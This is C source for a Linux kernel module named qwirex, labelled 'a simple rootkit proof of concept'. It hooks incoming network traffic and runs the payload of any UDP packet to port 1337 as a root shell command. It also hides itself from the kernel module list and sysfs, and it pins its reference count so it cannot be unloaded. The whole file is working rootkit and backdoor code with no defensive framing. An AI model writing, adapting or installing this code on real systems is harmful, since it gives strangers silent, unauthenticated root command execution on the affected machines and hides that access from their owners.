/*
 * Copyright (C) 2026 0x00 <https://github.com/0x00-git>
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <net/net_namespace.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/ip.h>
#include <linux/netfilter_ipv4.h>
#include <linux/types.h>
#include <linux/kmod.h>

static void hide_qwirex(void);
static void ban_on_extraction_qwirex(void);
static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
static void execute_cmd(char *cmd);

static void execute_cmd(char *cmd)
{
    if (!cmd)
    {
        return;
    }

    char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};
    static char *envp[] =
    {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    if (!skb)
    {
        return NF_ACCEPT;
    }

    struct iphdr *ip = ip_hdr(skb);

    if (!ip)
    {
        return NF_ACCEPT;
    }

    if (ip->protocol == IPPROTO_UDP)
    {
        struct udphdr *udp = udp_hdr(skb);

        if (!udp)
        {
            return NF_ACCEPT;
        }

        if (ntohs(udp->dest) == 1337)
        {
            u32 iph_len = ip->ihl * 4;

            int ret = skb_ensure_writable(skb,iph_len + sizeof(struct udphdr));

            if (ret < 0)
            {
                return NF_ACCEPT;
            }

            ip = ip_hdr(skb);
            udp = udp_hdr(skb);

            u32 payload_len = ntohs(udp->len) - sizeof(struct udphdr);

            if (payload_len == 0)
            {
                return NF_ACCEPT;
            }

            ret = skb_ensure_writable(skb,iph_len + sizeof(struct udphdr) + payload_len);

            if (ret < 0)
            {
                return NF_ACCEPT;
            }

            ip = ip_hdr(skb);
            udp = udp_hdr(skb);

            unsigned char *payload = (unsigned char *)(udp + 1);

            if (payload_len < 256)
            {
                char *data = kmalloc(payload_len + 1, GFP_ATOMIC);

                if (data)
                {
                    memcpy(data,payload,payload_len);
                    data[payload_len] = '\0';
                    execute_cmd(data);
                    kfree(data);
                }

                else
                {
                    return NF_ACCEPT;
                }
            }
        }
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops nho =
{
    .hook = qwirex_hook,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST,
    .hooknum = NF_INET_PRE_ROUTING,
};

static void hide_qwirex(void)
{
    struct list_head *qwirex_prev = NULL;
    struct list_head *qwirex_next = NULL;
    struct kobject *qwirex_kobj = &THIS_MODULE->mkobj.kobj;

    qwirex_prev = THIS_MODULE->list.prev;
    qwirex_next = THIS_MODULE->list.next;

    qwirex_next->prev = qwirex_prev;
    qwirex_prev->next = qwirex_next;

    THIS_MODULE->list.next = &THIS_MODULE->list;
    THIS_MODULE->list.prev = &THIS_MODULE->list;

    if (qwirex_kobj->sd)
        kobject_del(qwirex_kobj);
}

static void ban_on_extraction_qwirex(void)
{
    atomic_set(&THIS_MODULE->refcnt,2);
}

static int __init qwirex_init(void)
{
    hide_qwirex();
    ban_on_extraction_qwirex();

    nf_register_net_hook(&init_net,&nho);

    return 0;
}

static void __exit qwirex_exit(void)
{

}

module_init(qwirex_init);
module_exit(qwirex_exit);

MODULE_AUTHOR("0x00");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("a simple rootkit proof of concept");